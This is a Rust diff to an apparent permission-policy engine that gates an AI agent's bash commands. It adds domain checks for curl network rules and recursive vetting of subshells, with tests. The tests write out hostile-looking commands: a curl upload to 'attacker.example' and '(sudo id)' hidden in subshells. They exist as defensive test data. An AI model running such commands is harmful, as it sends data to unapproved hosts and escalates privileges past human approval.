@@ -65,13 +65,22 @@ impl ApprovalRule {
                 .requested_permissions
                 .contains(&Permission::DomainMutation)
         {
-            // T22 does not implement domain extraction; a domain-constrained
-            // rule therefore cannot match until a future task.
-            return false;
+            let Some(domains) = network_domains(tokens) else {
+                return false;
+            };
+            let Some(allowed) = normalized_allowed_domains(&self.allowed_network_domains) else {
+                return false;
+            };
+            if domains.is_empty() || !domains.iter().all(|domain| allowed.contains(domain)) {
+                return false;
+            }
         }
-        if !self.allowed_network_domains.is_empty() {
-            // Domain metadata without a network operation is still not
-            // meaningful until T23's domain extractor exists.
+        if !self.allowed_network_domains.is_empty()
+            && !action.requested_permissions.contains(&Permission::Network)
+            && !action
+                .requested_permissions
+                .contains(&Permission::DomainMutation)
+        {
             return false;
         }
         true
@@ -149,7 +158,7 @@ impl Policy {
     /// to be safely persisted. Broad or otherwise invalid rules are rejected
     /// with a typed error rather than silently accepted.
     pub fn try_with_rule(mut self, rule: ApprovalRule) -> Result<Self, RuleValidationError> {
-        if is_broad_prefix(&rule.literal_prefix) {
+        if is_broad_prefix(&rule.literal_prefix) && !is_narrow_network_rule(&rule) {
             return Err(RuleValidationError::BroadPrefix);
         }
         if rule_contains_secret_material(&rule) {
@@ -172,24 +181,50 @@ impl Policy {
 
         if action.tool == BASH_TOOL_NAME && action.operation == "exec" {
             let command = action.argv.first().map(String::as_str).unwrap_or("");
-            let segments = shell::segment_command(command);
-            if segments.is_empty() {
-                return PolicyDecision::NeedsApproval {
-                    matched_rules: Vec::new(),
-                    reason: "empty bash command".to_owned(),
-                };
-            }
-            let mut overall = PolicyDecision::Allow {
-                matched_rules: Vec::new(),
-            };
-            for segment in segments {
-                let decision = self.evaluate_bash_segment(action, &segment);
-                overall = combine(overall, decision);
-            }
-            overall
+            self.evaluate_bash_command(action, command, 0)
         } else {
             self.evaluate_non_bash(action)
         }
+    }
+
+    fn evaluate_bash_command(
+        &self,
+        action: &CanonicalAction,
+        command: &str,
+        depth: usize,
+    ) -> PolicyDecision {
+        const MAX_SUBSHELL_DEPTH: usize = 32;
+        if depth > MAX_SUBSHELL_DEPTH {
+            return PolicyDecision::NeedsApproval {
+                matched_rules: Vec::new(),
+                reason: "shell nesting exceeds policy limit".to_owned(),
+            };
+        }
+        let segments = shell::segment_command(command);
+        if segments.is_empty() {
+            return PolicyDecision::NeedsApproval {
+                matched_rules: Vec::new(),
+                reason: "empty bash command".to_owned(),
+            };
+        }
+        let mut overall = PolicyDecision::Allow {
+            matched_rules: Vec::new(),
+        };
+        for segment in segments {
+            let decision = if segment.is_subshell {
+                match shell::literal_subshell_body(&segment.raw) {
+                    Some(body) => self.evaluate_bash_command(action, body, depth + 1),
+                    None => PolicyDecision::NeedsApproval {
+                        matched_rules: Vec::new(),
+                        reason: "dynamic or unparseable shell construct".to_owned(),
+                    },
+                }
+            } else {
+                self.evaluate_bash_segment(action, &segment)
+            };
+            overall = combine(overall, decision);
+        }
+        overall
     }
 
     pub fn resolve(
@@ -431,7 +466,30 @@ impl Policy {
     }
 }
 
+fn is_narrow_network_rule(rule: &ApprovalRule) -> bool {
+    if rule.tool != BASH_TOOL_NAME
+        || !rule.allowed_permissions.contains(&Permission::Network)
+        || rule.allowed_network_domains.is_empty()
+        || is_broad_prefix_ignoring_network(&rule.literal_prefix)
+    {
+        return false;
+    }
+    let Some(domains) = network_domains(&rule.literal_prefix) else {
+        return false;
+    };
+    let Some(allowed) = normalized_allowed_domains(&rule.allowed_network_domains) else {
+        return false;
+    };
+    !domains.is_empty() && domains.iter().all(|domain| allowed.contains(domain))
+}
+
 pub(crate) fn is_broad_prefix(prefix: &[String]) -> bool {
+    is_broad_prefix_ignoring_network(prefix)
+        || shell::effective_command(prefix, 0)
+            .is_some_and(|eff| shell::is_network_command(eff.tokens))
+}
+
+fn is_broad_prefix_ignoring_network(prefix: &[String]) -> bool {
     if prefix.len() < 2 {
         return true;
     }
@@ -453,7 +511,6 @@ pub(crate) fn is_broad_prefix(prefix: &[String]) -> bool {
         || has_unmodeled_option_payload(eff.tokens)
         || has_control_option_payload(eff.tokens)
         || has_embedded_execution_payload(eff.tokens)
-        || shell::is_network_command(eff.tokens)
     {
         return true;
     }
@@ -469,6 +526,66 @@ pub(crate) fn is_broad_prefix(prefix: &[String]) -> bool {
     }
 
     false
+}
+
+fn normalized_allowed_domains(domains: &[String]) -> Option<Vec<String>> {
+    let mut normalized = Vec::with_capacity(domains.len());
+    for domain in domains {
+        let value = normalize_domain(domain)?;
+        if !normalized.contains(&value) {
+            normalized.push(value);
+        }
+    }
+    Some(normalized)
+}
+
+fn normalize_domain(domain: &str) -> Option<String> {
+    let domain = domain.trim().trim_end_matches('.').to_ascii_lowercase();
+    if domain.is_empty()
+        || domain.bytes().any(|byte| {
+            byte.is_ascii_whitespace()
+                || matches!(byte, b'/' | b'@' | b':' | b'*' | b'?' | b'[' | b']')
+        })
+    {
+        return None;
+    }
+    let parsed = reqwest::Url::parse(&format!("https://{domain}/")).ok()?;
+    let host = parsed
+        .host_str()?
+        .trim_end_matches('.')
+        .to_ascii_lowercase();
+    (!host.is_empty()).then_some(host)
+}
+
+fn network_domains(tokens: &[String]) -> Option<Vec<String>> {
+    let eff = shell::effective_command(tokens, 0)?;
+    if eff.leading_assignments > 0
+        || eff.had_generic_wrapper
+        || shell::command_basename(eff.tokens.first()?) != "curl"
+        || eff.tokens.len() < 2
+    {
+        return None;
+    }
+
+    let mut domains = Vec::new();
+    for token in eff.tokens.iter().skip(1) {
+        // Keep the durable network-rule grammar deliberately narrow. Curl
+        // options can load config, credentials, proxies, redirects, or extra
+        // destinations, so only literal HTTP(S) URL operands are eligible.
+        let url = reqwest::Url::parse(token).ok()?;
+        if !matches!(url.scheme(), "http" | "https")
+            || !url.username().is_empty()
+            || url.password().is_some()
+        {
+            return None;
+        }
+        let host = normalize_domain(url.host_str()?)?;
+        if !domains.contains(&host) {
+            domains.push(host);
+        }
+    }
+
+    (!domains.is_empty()).then_some(domains)
 }
 
 fn rule_contains_secret(projector: &SecretAwareActionProjector, rule: &ApprovalRule) -> bool {
@@ -5197,6 +5314,108 @@ mod tests {
                 }) if reason == "sandbox summary is broader than the default policy"
             ),
             "workspace_only=false must take precedence over internal-state path"
+        );
+    }
+
+    #[test]
+    fn literal_subshells_preserve_the_strictest_inner_decision() {
+        let p = policy()
+            .try_with_rule(ApprovalRule {
+                id: "git-status".to_owned(),
+                tool: "bash".to_owned(),
+                literal_prefix: vec!["git".to_owned(), "status".to_owned()],
+                effect: RuleEffect::Allow,
+                workspace_only: true,
+                allowed_permissions: vec![Permission::Exec],
+                allowed_network_domains: vec![],
+            })
+            .unwrap();
+
+        assert!(
+            p.evaluate(&bash("(git status)")).is_allow(),
+            "a fully parsed allowed subshell should remain allowed"
+        );
+        for command in [
+            "(sudo id)",
+            "(git status; (sudo id))",
+            "echo ok | (sudo id)",
+        ] {
+            let action = bash(command);
+            let decision = p.evaluate(&action);
+            assert!(
+                decision.is_forbidden(),
+                "inner hard deny must dominate for {command}: {decision:?}"
+            );
+            assert!(
+                matches!(
+                    p.resolve(&action, UserDecision::ApproveOnce, &projector()),
+                    ResolvedDecision::Rejected { .. }
+                ),
+                "ApproveOnce must not bypass an inner hard deny: {command}"
+            );
+        }
+    }
+
+    #[test]
+    fn network_rules_bind_every_visible_destination_to_allowed_domains() {
+        let action = bash("curl https://example.com/api");
+        let rule = ApprovalRule {
+            id: "curl-example".to_owned(),
+            tool: "bash".to_owned(),
+            literal_prefix: shell::tokenize_command("curl https://example.com/api"),
+            effect: RuleEffect::Allow,
+            workspace_only: true,
+            allowed_permissions: vec![Permission::Exec, Permission::Network],
+            allowed_network_domains: vec!["EXAMPLE.COM.".to_owned()],
+        };
+        let p = policy()
+            .try_with_rule(rule.clone())
+            .expect("domain-constrained network rule");
+
+        assert!(p.evaluate(&action).is_allow());
+        assert!(matches!(
+            policy().resolve(&action, UserDecision::ApproveAlways { rule }, &projector()),
+            ResolvedDecision::ApproveAlways(_)
+        ));
+
+        let extra_destination =
+            bash("curl https://example.com/api https://attacker.example/upload");
+        assert!(
+            !p.evaluate(&extra_destination).is_allow(),
+            "a prefix rule must not authorize an unlisted destination suffix"
+        );
+
+        let mismatched_rule = ApprovalRule {
+            id: "curl-mismatch".to_owned(),
+            tool: "bash".to_owned(),
+            literal_prefix: shell::tokenize_command("curl https://example.com/api"),
+            effect: RuleEffect::Allow,
+            workspace_only: true,
+            allowed_permissions: vec![Permission::Exec, Permission::Network],
+            allowed_network_domains: vec!["other.example".to_owned()],
+        };
+        assert!(matches!(
+            policy().try_with_rule(mismatched_rule),
+            Err(RuleValidationError::BroadPrefix)
+        ));
+
+        let redirecting_rule = ApprovalRule {
+            id: "curl-redirect".to_owned(),
+            tool: "bash".to_owned(),
+            literal_prefix: shell::tokenize_command("curl -L https://example.com/api"),
+            effect: RuleEffect::Allow,
+            workspace_only: true,
+            allowed_permissions: vec![Permission::Exec, Permission::Network],
+            allowed_network_domains: vec!["example.com".to_owned()],
+        };
+        assert!(
+            policy().try_with_rule(redirecting_rule).is_err(),
+            "redirect-capable curl rules can reach a destination not named in the action"
+        );
+        assert!(
+            !p.evaluate(&bash("curl https://example.com/api -L"))
+                .is_allow(),
+            "an allowed prefix must not acquire redirect behavior through a suffix"
         );
     }
 }
